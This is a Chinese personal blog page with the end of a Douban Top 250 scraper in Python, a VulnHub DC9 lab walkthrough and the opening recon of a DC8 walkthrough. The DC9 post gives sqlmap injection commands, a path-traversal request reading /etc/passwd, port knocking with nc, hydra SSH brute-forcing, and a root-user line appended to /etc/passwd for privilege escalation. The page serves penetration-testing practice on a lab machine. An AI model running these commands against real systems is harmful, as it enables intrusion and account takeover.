class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup </span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.error</span><br><span class="line"><span class="keyword">import</span> xlwt</span><br><span class="line"></span><br><span class="line"><span class="comment">#影片链接</span></span><br><span class="line">findlink=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;a href=&quot;(.*?)&quot;&gt;&#x27;</span>) <span class="comment">#创建正则表达式的匹配规则,r防止转义</span></span><br><span class="line"><span class="comment">#图片链接</span></span><br><span class="line">findimages=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;img.*src=&quot;(.*?)&quot;&#x27;</span>,re.S)<span class="comment">#(.*?)括号为一组，.为单个字符，*多次出现，？该组出现0次或1次，re.S防止换行符的出现</span></span><br><span class="line"><span class="comment">#片名</span></span><br><span class="line">findname=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;title&quot;&gt;(.*)&lt;/span&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#影片评分</span></span><br><span class="line">findscore=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;rating_num&quot; property=&quot;v:average&quot;&gt;(.*)&lt;/span&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#评价人数</span></span><br><span class="line">findpeople=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span&gt;(\d*)人评价&lt;/span&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#概况</span></span><br><span class="line">findinq=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;span class=&quot;inq&quot;&gt;(.*)&lt;/span&gt;&#x27;</span>)</span><br><span class="line"><span class="comment">#找到影片的相关内容</span></span><br><span class="line">findcontent=re.<span class="built_in">compile</span>(<span class="string">r&#x27;&lt;p class=&quot;&quot;&gt;(.*?)&lt;/p&gt;&#x27;</span>,re.S)<span class="comment">#？0次到1次出现</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    baseurl=<span class="string">&quot;https://movie.douban.com/top250?start=&quot;</span></span><br><span class="line">    datalist=getData(baseurl)</span><br><span class="line">    savepath=<span class="string">&quot;E:\\\Python\\豆瓣电影top250.xls&quot;</span></span><br><span class="line">    savedata(datalist,savepath)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">baseurl</span>):   <span class="comment">#得到响应并处理</span></span><br><span class="line">  datalist=[]</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">10</span>):</span><br><span class="line">    url=baseurl+<span class="built_in">str</span>(i*<span class="number">25</span>)</span><br><span class="line">    html=askURL(url)  <span class="comment">#嵌套一个请求函数见下方</span></span><br><span class="line">    <span class="comment">#解析响应，处理数据部分</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> soup.find_all(<span class="string">&#x27;div&#x27;</span>,class_=<span class="string">&quot;item&quot;</span>):<span class="comment">#查找符合要求的字符串</span></span><br><span class="line">        <span class="comment">#print(item)</span></span><br><span class="line">        data=[] <span class="comment">#保存一部电影的信息</span></span><br><span class="line">        item=<span class="built_in">str</span>(item)</span><br><span class="line">        <span class="comment">#影片各信息</span></span><br><span class="line">        link=re.findall(findlink,item)[<span class="number">0</span>]<span class="comment">#re库通过正则表达式查找指定的字符串,只要第一个</span></span><br><span class="line">        data.append(link)</span><br><span class="line">        imgsrc=re.findall(findimages,item)[<span class="number">0</span>]</span><br><span class="line">        data.append(imgsrc)</span><br><span class="line">        title=re.findall(findname,item)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(title)==<span class="number">2</span>):</span><br><span class="line">            ctitle=title[<span class="number">0</span>]</span><br><span class="line">            data.append(ctitle)         <span class="comment">#添加中文名</span></span><br><span class="line">            otitle=title[<span class="number">1</span>].replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&quot;</span>)<span class="comment">#去掉斜杠</span></span><br><span class="line">            data.append(otitle)         <span class="comment">#添加外文名儿</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ctitle=title[<span class="number">0</span>]</span><br><span class="line">            data.append(ctitle)</span><br><span class="line">            data.append(<span class="string">&quot;无&quot;</span>)           <span class="comment">#保证导入表格后能够对齐</span></span><br><span class="line">        rating=re.findall(findscore,item)[<span class="number">0</span>]</span><br><span class="line">        data.append(rating)             <span class="comment">#评分</span></span><br><span class="line">        people_number=re.findall(findpeople,item)[<span class="number">0</span>]</span><br><span class="line">        data.append(people_number)</span><br><span class="line">        inq=re.findall(findinq,item)</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">len</span>(inq)!=<span class="number">0</span>):</span><br><span class="line">          data.append(inq[<span class="number">0</span>].replace(<span class="string">&quot;。&quot;</span>,<span class="string">&quot;&quot;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">          data.append(<span class="string">&quot;无概述&quot;</span>)</span><br><span class="line">        Content=re.findall(findcontent,item)[<span class="number">0</span>]</span><br><span class="line">        db=re.sub(<span class="string">&#x27;&lt;br(\s+)?/&gt;(\s+)?&#x27;</span>,<span class="string">&quot;&quot;</span>,Content)</span><br><span class="line">        db=db.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        data.append(db.strip())     <span class="comment">#去掉空格</span></span><br><span class="line">        datalist.append(data)       <span class="comment">#添加一部电影信息到datalist中</span></span><br><span class="line">  <span class="comment">#print(datalist)</span></span><br><span class="line">  <span class="keyword">return</span> datalist</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">savedata</span>(<span class="params">datalist,savepath</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;*********saving**********&quot;</span>)</span><br><span class="line">    excel=xlwt.Workbook(encoding=<span class="string">&quot;utf-8&quot;</span>,style_compression=<span class="number">0</span>)<span class="comment">#创建表格，utf-8解码</span></span><br><span class="line">    sheet=excel.add_sheet(<span class="string">&quot;豆瓣电影top250&quot;</span>,cell_overwrite_ok=<span class="literal">True</span>)<span class="comment">#每个单元可以覆盖</span></span><br><span class="line">    titles=(<span class="string">&quot;电影详情连接&quot;</span>,<span class="string">&quot;电影图片链接&quot;</span>,<span class="string">&quot;电影中文名&quot;</span>,<span class="string">&quot;电影外文名&quot;</span>,<span class="string">&quot;电影评分&quot;</span>,<span class="string">&quot;评分人数&quot;</span>,<span class="string">&quot;概述&quot;</span>,<span class="string">&quot;影片信息&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">        sheet.write(<span class="number">0</span>,i,titles[i])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">250</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;正在写入第%d条数据&quot;</span>%(i+<span class="number">1</span>))</span><br><span class="line">        data=datalist[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">          sheet.write(i+<span class="number">1</span>,j,data[j])</span><br><span class="line">    excel.save(savepath)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">askURL</span>(<span class="params">url</span>):</span><br><span class="line">  head=&#123;</span><br><span class="line">    <span class="string">&quot;User-Agent&quot;</span>:<span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">  request=urllib.request.Request(url,headers=head)</span><br><span class="line">  html=<span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    response=urllib.request.urlopen(request)</span><br><span class="line">    html=response.read().decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    <span class="comment">#print(html)</span></span><br><span class="line">  <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> fail: <span class="comment">#将回传错误信息定为fail</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(fail,<span class="string">&quot;code&quot;</span>): <span class="comment">#判断fail里是否有&quot;code&quot;字符，如果有，输出，没有，继续</span></span><br><span class="line">      <span class="built_in">print</span>(fail.code)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">hasattr</span>(fail,<span class="string">&quot;reason&quot;</span>):<span class="comment">#判断fail里是否有&quot;reason&quot;字符，如果有，输出，没有，继续</span></span><br><span class="line">      <span class="built_in">print</span>(fail.reason)</span><br><span class="line">  <span class="keyword">return</span> html</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:  <span class="comment">#主函数入口</span></span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>实际保存效果</p>
<p><img src="/../images/image-20210302194929380.png" alt="image-20210302194929380"></p>
<hr>
<p>[toc]</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color1">python.学习篇</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2021/03/02/python%E7%88%AC%E8%99%AB/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-DC9靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC9靶机渗透记录</a>
  
    </h1>
  


  
  
<a href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
        <time datetime="2021-02-28T08:41:59.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-28</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>DC9靶机渗透记录</center>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>老套路了，还是直接上图</p>
<p><img src="/../images/image-20210228141847887.png" alt="image-20210228141847887"></p>
<p>目标靶机ip<code>192.168.8.122</code>，本机ip<code>192.168.8.121</code></p>
<p><img src="/../images/image-20210228142057510.png" alt="image-20210228142057510"></p>
<p>22和80端口（奇怪的是这里22端口被折叠了），apache中间件，Debian系统，访问一下其web服务</p>
<p><img src="/../images/image-20210228142325456.png" alt="image-20210228142325456"></p>
<p>一时间没看出来是什么CMS</p>
<p><img src="/../images/image-20210228142614588.png" alt="image-20210228142614588"></p>
<p>目录扫描给的结果也十分简略</p>
<p><img src="/../images/image-20210228142733412.png" alt="image-20210228142733412"></p>
<h2 id="发现利用点"><a href="#发现利用点" class="headerlink" title="发现利用点"></a>发现利用点</h2><p><code>/includes</code>目录有一个信息泄露但并没有什么卵用。但是在主页面的Search中，可以检索Display All Record的用户，也即与数据库存在交互，但是搜索的结果为<code>/result.php</code>说明不是Get传参，而是Post！有了个思路了，我们打开burpsuite</p>
<p><img src="/../images/image-20210228143300834.png" alt="image-20210228143300834"></p>
<p>果然，Post传参，变量为search，那说明在这个位置可能存在sql注入</p>
<p><img src="/../images/image-20210228143802832.png" alt="image-20210228143802832"></p>
<p>果然，当我测了几种注入就出来了前面的所有信息，那接下来，懒人用法：sqlmap！</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u http://192.168.8.122/results.php --data &quot;search=1&quot; --dbs</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228144145763.png" alt="image-20210228144145763"></p>
<p>很快就爆出来了库名儿</p>
<p>忙猜一波Staff库，users可能是web页面上的哪些信息</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap python3 -u http://192.168.8.122/results.php --data &quot;search=1&quot; -D Staff -T Users -C Username,Password --dump</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228144606539.png" alt="image-20210228144606539"></p>
<p>对此我只能说sqlmap真香啊！还自带MD5解码，呜呜呜太贴心了</p>
<table>
<thead>
<tr>
<th>Username</th>
<th>Password</th>
</tr>
</thead>
<tbody><tr>
<td>admin</td>
<td>856f5de590ef37314e7c3bdf6f8a66dc (transorbital1)</td>
</tr>
</tbody></table>
<p>不说了，直接管理员账号登录呜呜呜</p>
<p><img src="/../images/image-20210228145150795.png" alt="image-20210228145150795"></p>
<p>登录上去后在Manage页面下方，有一个<code>File does not exist</code>的话语，好生熟悉哇！这不就。。。文件包含漏洞？</p>
<p>构造Get传参，使用burpsuite爆破变量名称</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/manage.php?$cat$=../../../../etc/passwd</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228151117006.png" alt="image-20210228151117006"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class="line">messagebus:x:104:110::/nonexistent:/usr/sbin/nologin</span><br><span class="line">sshd:x:105:65534::/run/sshd:/usr/sbin/nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class="line">mysql:x:106:113:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class="line">marym:x:1001:1001:Mary Moe:/home/marym:/bin/bash</span><br><span class="line">julied:x:1002:1002:Julie Dooley:/home/julied:/bin/bash</span><br><span class="line">fredf:x:1003:1003:Fred Flintstone:/home/fredf:/bin/bash</span><br><span class="line">barneyr:x:1004:1004:Barney Rubble:/home/barneyr:/bin/bash</span><br><span class="line">tomc:x:1005:1005:Tom Cat:/home/tomc:/bin/bash</span><br><span class="line">jerrym:x:1006:1006:Jerry Mouse:/home/jerrym:/bin/bash</span><br><span class="line">wilmaf:x:1007:1007:Wilma Flintstone:/home/wilmaf:/bin/bash</span><br><span class="line">bettyr:x:1008:1008:Betty Rubble:/home/bettyr:/bin/bash</span><br><span class="line">chandlerb:x:1009:1009:Chandler Bing:/home/chandlerb:/bin/bash</span><br><span class="line">joeyt:x:1010:1010:Joey Tribbiani:/home/joeyt:/bin/bash</span><br><span class="line">rachelg:x:1011:1011:Rachel Green:/home/rachelg:/bin/bash</span><br><span class="line">rossg:x:1012:1012:Ross Geller:/home/rossg:/bin/bash</span><br><span class="line">monicag:x:1013:1013:Monica Geller:/home/monicag:/bin/bash</span><br><span class="line">phoebeb:x:1014:1014:Phoebe Buffay:/home/phoebeb:/bin/bash</span><br><span class="line">scoots:x:1015:1015:Scooter McScoots:/home/scoots:/bin/bash</span><br><span class="line">janitor:x:1016:1016:Donald Trump:/home/janitor:/bin/bash</span><br><span class="line">janitor2:x:1017:1017:Scott Morrison:/home/janitor2:/bin/bash</span><br></pre></td></tr></table></figure>



<p>显然变量名仍然为<code>file</code>，然后写入报错日志，就像之前的一样吗，但是访问了一下发现，该靶机并无法访问日志（不是nginx），所以思路要向挂马方向转变。以上是<code>/etc/passwd</code>的用户信息，可以看出来有很多很多，突然想起一个细节，，，我爆数据库时候没细看其他库名儿。。。</p>
<p><img src="/../images/image-20210228153032625.png" alt="image-20210228153032625"></p>
<p>果然啊，在其他库里发现了这些用户信息，失算了。。。</p>
<p>之后是ssh爆破了，不过显然，之前的信息22端口折叠了，这里真的是断思路了。只好求助谷歌爸爸，搜索发现这是端口保护机制，首先访问一下<code>/etc/knockd.conf</code>文件</p>
<p><img src="/../images/image-20210228153536493.png" alt="image-20210228153536493"></p>
<p>端口敲门，依次访问7469，8475，9842这几个端口，即可打开22端口，直接nc连接进行敲击</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.8.122 7469</span><br><span class="line">nc 192.168.8.122 8475</span><br><span class="line">nc 192.168.8.122 9842</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228154006222.png" alt="image-20210228154006222"></p>
<p>有结果可见，ssh的22端口变为开放状态，那就hydra爆破吧！(。。。用户名儿和密码的字典里不要有空格，，，)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L DC9-user.txt -P DC9-pwd.txt 192.168.8.122 ssh</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228154653692.png" alt="image-20210228154653692"></p>
<p>使用janitor用户登录，在他的<code>/home/janitor</code>文件夹发现了<code>.secrets-for-putin</code>文件，里面有一个密码本</p>
<p><img src="/../images/image-20210228155333657.png" alt="image-20210228155333657"></p>
<p>使用了<code>sudo -l</code>后发现该用户并无无密码权限</p>
<p>那继续换人爆破</p>
<p><img src="/../images/image-20210228155813500.png" alt="image-20210228155813500"></p>
<h2 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h2><p>加入新密码后又爆破出来了一个账号，使用<code>fredf:B4-Tru3-001</code>登录</p>
<p><img src="/../images/image-20210228160027751.png" alt="image-20210228160027751"></p>
<p>该用户具有无密码的root权限</p>
<p><img src="/../images/image-20210228160219128.png" alt="image-20210228160219128"></p>
<p>以防万一，也查了一下SUID提权，发现不太熟悉，不如直接走预期解</p>
<p><img src="/../images/image-20210228160535718.png" alt="image-20210228160535718"></p>
<p>运行该文件，发现需要一个test.py的python程序。找吧</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name test.py 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228160759405.png" alt="image-20210228160759405"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span> (sys.argv) != <span class="number">3</span> :</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Usage: python test.py read append&quot;</span>)</span><br><span class="line">    sys.exit (<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">1</span>], <span class="string">&quot;r&quot;</span>)</span><br><span class="line">    output = (f.read())</span><br><span class="line"></span><br><span class="line">    f = <span class="built_in">open</span>(sys.argv[<span class="number">2</span>], <span class="string">&quot;a&quot;</span>)</span><br><span class="line">    f.write(output)</span><br><span class="line">    f.close()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>py文件的含义为：<code>读取参数1的内容，然后将参数1的内容写入到参数2的内容中。</code></p>
<p>那我们可以构造一个root权限用户，将该用户信息写入文件内，将改文件作为参数1，<code>/etc/passwd</code>作为参数2，这样就创建了一个root权限用户，就能实现提权了 <a target="_blank" rel="noopener" href="https://www.jianshu.com/p/7c721bdaf34b">链接</a></p>
</blockquote>
<p>首先，仿照<code>/etc/passwd</code>格式生成一个root用户文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt admin 123456</span><br><span class="line">-1 的意思是使用md5加密算法</span><br><span class="line">-salt 自动插入一个随机数作为文件内容加密</span><br><span class="line">admin 123456 用户名和密码</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash&#x27;</span> &gt;&gt; /tmp/shell</span><br><span class="line">    <span class="comment"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span></span><br><span class="line">    </span><br><span class="line">sudo ./test /tmp/shell /etc/passwd </span><br></pre></td></tr></table></figure>

<p><img src="/../images/image-20210228162335447.png" alt="image-20210228162335447"></p>
<p>OK！</p>
<p><img src="/../images/image-20210228162414289.png" alt="image-20210228162414289"></p>
<p>莫名又有点小伤感了</p>
<h2 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h2><p>呼，至此DC系列结束了XD</p>
<p>很好玩，学到了很多很多很多！</p>
<p>但是，自己的基础知识太差了，接下来会恶补基础知识吧！</p>
<p>加油！</p>

    

    

    

  </div>
  <div class="article-info article-info-index">
    
    
	<div class="article-tag tagcloud">
		<i class="icon-price-tags icon"></i>
		<ul class="article-tag-list">
			 
        		<li class="article-tag-list-item">
        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">vulnhub</a>
        		</li>
      		
		</ul>
	</div>

    

    
    <p class="article-more-link">
      <a class="article-more-a" href="/2021/02/28/DC9%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/">展开全文 >></a>
    </p>
    

    
    <div class="clearfix"></div>
  </div>
  </div>
</article>

<aside class="wrap-side-operation">
    <div class="mod-side-operation">
        
        <div class="jump-container" id="js-jump-container" style="display:none;">
            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
                <i class="icon-font icon-back"></i>
            </a>
            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
                <i class="icon-font icon-plane jump-plane"></i>
            </div>
        </div>
        
        
    </div>
</aside>




  
    <article id="post-DC8靶机渗透记录" class="article article-type-post  article-index" itemscope itemprop="blogPost">
  <div class="article-inner">
    
      <header class="article-header">
  
  
    <h1 itemprop="name">
	
	  <a class="article-title" href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" target="_blank">DC8靶机渗透记录</a>
  
    </h1>
  


  
  
<a href="/2021/02/27/DC8%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F%E8%AE%B0%E5%BD%95/" class="archive-article-date">
        <time datetime="2021-02-27T07:17:54.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-02-27</time>
</a>

  
  
    

  
  </header>
  
  <div class="article-entry" itemprop="articleBody">
    
    <center>DC8靶机渗透记录</center>

<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>直接上结果</p>
<p><img src="/../images/image-20210227115537834.png" alt="image-20210227115537834"></p>
<p><code>192.168.8.120</code>为VM平台，也即目标靶机，本机ip<code>182.168.8.121</code></p>
<p><img src="/../images/image-20210227121043178.png" alt="image-20210227121043178"></p>
<p>经典22，80端口，apache服务</p>
<p><img src="/../images/image-20210227121137096.png" alt="image-20210227121137096"></p>
<p>drupal的CMS，目录扫描部分结果如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[12:13:08] 200 -    3KB - /install.php </span><br><span class="line">[12:13:10] 301 -  234B  - /misc  -&gt;  http://192.168.8.120/misc/</span><br><span class="line">[12:13:10] 301 -  237B  - /modules  -&gt;  http://192.168.8.120/modules/                  </span><br><span class="line">[12:13:11] 200 -    7KB - /node                                                                        [12:13:13] 301 -  238B  - /profiles  -&gt;  http://192.168.8.120/profiles/</span><br><span class="line">[12:13:14] 200 -    2KB - /robots.txt</span><br><span class="line">[12:13:14] 301 -  237B  - /scripts  -&gt;  http://192.168.8.120/scripts/</span><br><span class="line">[12:13:15] 301 -  235B  - /sites  -&gt;  http://192.168.8.120/sites/         </span><br><span class="line">[12:13:17] 301 -  236B  - /themes  -&gt;  http://192.168.8.120/themes/  </span><br><span class="line">[12:13:18] 200 -    8KB - /user         </span><br><span class="line">[12:13:18] 200 -    8KB - /user/login/</span><br><span class="line">[12:13:18] 200 -    8KB - /user/       </span><br><span class="line">[12:13:18] 200 -    2KB - /web.config</span><br><span class="line">[12:13:19] 200 -   42B  - /xmlrpc.php </span><br></pre></td></tr></table></figure>

<p>先康康robots.txt文件</p>
<p><img src="/../images/image-20210227122359070.png" alt="image-20210227122359070"></p>
<p>挺好的，还出来了登录页面<code>/user/login</code>，其他的没权限康</p>
